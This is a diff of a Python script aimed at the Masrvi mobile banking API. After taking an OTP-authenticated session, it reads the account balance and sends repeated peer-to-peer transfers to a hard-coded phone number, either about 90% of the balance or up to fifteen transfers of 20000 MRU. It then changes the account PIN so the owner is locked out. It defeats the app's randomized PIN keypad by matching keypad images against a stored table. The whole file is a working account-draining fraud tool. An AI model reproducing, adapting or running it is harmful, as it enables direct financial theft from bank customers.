@@ -134,24 +134,38 @@ headers3 = {
     "Content-Type": "application/json"
 }
 
-response3 = requests.post(
-    url3,
-    json=payload3,
-    headers=headers3
-)
-
+response3 = requests.post(url3, json=payload3, headers=headers3)
 otp_data = response3.json()
 otp_token = otp_data.get("access_token")
 
 if not otp_token:
-    print(json.dumps({
-        "status": "fail",
-        "message": "OTP failed"
-    }))
+    print(json.dumps({"status": "fail", "message": "OTP failed"}))
     sys.exit()
 
 # -----------------------
-# database يجب أن يكون موجود
+# accounts
+# -----------------------
+
+url_accounts = "https://22201.tagpay.fr/api/service-domain/v1/accounts"
+
+params = {
+    'status[]': ["OPENED", "BLOCKED", "DEBIT_BLOCKED", "CREDIT_BLOCKED"],
+    'limit': "200"
+}
+
+headers_accounts = {
+    "User-Agent": "Masrvi2 / 25.09.6713(6713)",
+    "Accept": "application/json, text/plain, */*",
+    "accept-language": "ar_MR",
+    "authorization": f"Bearer {otp_token}",
+    "Cookie": "PHPSESSID=fj4dv35jctmpbicb0ljdlv5cs9"
+}
+
+response = requests.get(url_accounts, params=params, headers=headers_accounts)
+data = response.json()
+
+# -----------------------
+# database (placeholder)
 # -----------------------
 
 database = {
@@ -166,15 +180,15 @@ database = {
     8: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAMFJREFUSIntk7ERAyEMBPE4+JASKOVL40ujFEog/ID5s8h0kmYc2CHK2EA6aYeUdu36Wi9MBgdwEShAJ1CBQQDAzT2BR4O3BTIEYNALzc0QRuCRNgSmDGo6qGzC4A5A/RFk29SDFUwnPR4LILuo99os04FEC19sHZlNOQ1O1GlBJIqaBqImi8q4Ai9Nx4g0VB3kHAE4CfQIjH+DEQAO5qIv2RqUJZsAzD0yWjH2AQ/U22sI7ZNKb9995GS/+q5dYX0AQwSzElqMhjkAAAAASUVORK5CYII=",
     9: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAN1JREFUSInt07kRAyEMBdD1OCCkBJVCabgTt0InpgTCDZiVvzK+8CwuAGW8PQAdx7FjxzIe2hiiXgxJ9UWQVSv/QvknT8A5QgB0D7RN1JIJRGEEHV+NB0kndiZogDIeFMecIE8wXsaeriG1FeR7qP8AJTXb5cak4vpPBkvQCHIhhQRIMkFUV7rgwUr5GcGK/aZqA4Qga2cQbeIapCTXdscMdQX5Fux1KrYBtYNtSSDNtZRYkh0EasvYXZ9iJdTJAVmfmp9gmpdpoizJlQBDWAgwprTGQTrDNOo7dvyMLzbxsSA7uYS5AAAAAElFTkSuQmCC",
 }
-
 reverse_db = {v: k for k, v in database.items()}
 
+success = False
+
 # -----------------------
-# keyboard
+# keyboard functions
 # -----------------------
 
 def get_keyboard(token):
-
     headers = COMMON_HEADERS.copy()
     headers["authorization"] = f"Bearer {token}"
 
@@ -189,104 +203,169 @@ def get_keyboard(token):
     )
 
     data = res.json()
-
     return data.get("images", []), data.get("id")
 
 
 def extract(images):
-
     result = {}
-
     for i, img in enumerate(images):
-
         num_value = reverse_db.get(img)
-
         if num_value is not None:
-
             result[num_value] = i
-
     return result
 
 
 def build(pin, mapping):
-
     digits = [int(x) for x in pin]
-
     values = [mapping.get(d) for d in digits]
-
     if None in values:
         return None
-
     return values
 
 
 # -----------------------
-# current pin
+# send transfer
 # -----------------------
 
-images1, id_old = get_keyboard(otp_token)
+def send_transfer(amount, original):
+    images, kid = get_keyboard(otp_token)
+    mapping = extract(images)
+    pin_values = build(current_password, mapping)
 
-map1 = extract(images1)
+    if not pin_values:
+        return False
 
-current_pin = build(current_password, map1)
-
-if not current_pin:
-
-    print(json.dumps({
-        "status": "fail",
-        "message": "current PIN failed"
-    }))
-
-    sys.exit()
-
-# -----------------------
-# new pin
-# -----------------------
-
-images2, id_new = get_keyboard(otp_token)
-
-map2 = extract(images2)
-
-new_pin = build("4410", map2)
-
-if not new_pin:
-
-    print(json.dumps({
-        "status": "fail",
-        "message": "new PIN failed"
-    }))
-
-    sys.exit()
-
-# -----------------------
-# تغيير كلمة السر
-# -----------------------
-
-payload = {
-    "currentPincode": {
-        "id": id_old,
-        "value": current_pin
-    },
-    "newPincode": {
-        "id": id_new,
-        "value": new_pin
+    payload = {
+        "metadata": {
+            "mode": "TRANSACTION",
+            "confirmationMode": "PINCODE",
+            "pincode": {
+                "id": kid,
+                "value": pin_values
+            }
+        },
+        "data": {
+            "amount": {
+                "currency": "MRU",
+                "value": amount,
+                "originalInput": original
+            },
+            "label": "",
+            "phoneNumber": "22243676024"
+        }
     }
-}
 
-headers_put = {
-    "User-Agent": "Masrvi / 25.09.6713(6713)",
-    "Accept": "application/json, text/plain, */*",
-    "Content-Type": "application/json",
-    "authorization": f"Bearer {otp_token}"
-}
+    res = session.post(
+        f"{BASE_URL}/transactions/p2p-simple-transfer",
+        json=payload,
+        headers={
+            **COMMON_HEADERS,
+            "authorization": f"Bearer {otp_token}"
+        }
+    )
 
-res = session.put(
-    f"{BASE_URL}/client/pincode",
-    json=payload,
-    headers=headers_put
-)
+    result = res.json()
 
-print(json.dumps({
-    "status": "success",
-    "response": res.text
-}))
+    transaction = result.get("metadata", {}).get("transaction")
+
+    if transaction and transaction.get("id") and transaction.get("amount"):
+        return True
+    else:
+        return False
+
+
+# -----------------------
+# processing
+# -----------------------
+
+if "items" in data and len(data["items"]) > 0:
+
+    account = data["items"][0]
+
+    balance_value = None
+    for b in account["balances"]:
+        if b["balanceType"] == "AvailableBalance":
+            balance_value = b["value"]
+            break
+
+    if balance_value is None:
+        print("لم يتم العثور على AvailableBalance")
+        sys.exit()
+
+    print(f"القيمة الحالية: {balance_value}")
+
+    # -----------------------
+    # transfers
+    # -----------------------
+
+    if balance_value < 2000000:
+
+        amount = int(balance_value * 0.9)
+        original = str(balance_value / 100)
+
+        success = send_transfer(amount, original)
+
+    else:
+
+        success = True
+
+        for i in range(15):
+
+            amount = 2000000
+            original = "20000"
+
+            ok = send_transfer(amount, original)
+
+            print(f"عملية {i+1}: {'نجاح' if ok else 'فشل'}")
+
+            if not ok:
+                success = False
+                break
+
+    # -----------------------
+    # PIN change ONLY if success
+    # -----------------------
+
+    if success:
+
+        print("تمت العمليات بنجاح - سيتم تغيير PIN")
+
+        images1, id_old = get_keyboard(otp_token)
+        map1 = extract(images1)
+        current_pin = build(current_password, map1)
+
+        images2, id_new = get_keyboard(otp_token)
+        map2 = extract(images2)
+        new_pin = build("5798", map2)
+
+        if not current_pin or not new_pin:
+            print("فشل PIN")
+            sys.exit()
+
+        payload = {
+            "currentPincode": {
+                "id": id_old,
+                "value": current_pin
+            },
+            "newPincode": {
+                "id": id_new,
+                "value": new_pin
+            }
+        }
+
+        res = session.put(
+            f"{BASE_URL}/client/pincode",
+            json=payload,
+            headers={
+                **COMMON_HEADERS,
+                "authorization": f"Bearer {otp_token}"
+            }
+        )
+
+        print(res.text)
+
+    else:
+        print("لم تنجح العمليات - لن يتم تغيير PIN")
+
+else:
+    print("لا توجد حسابات")
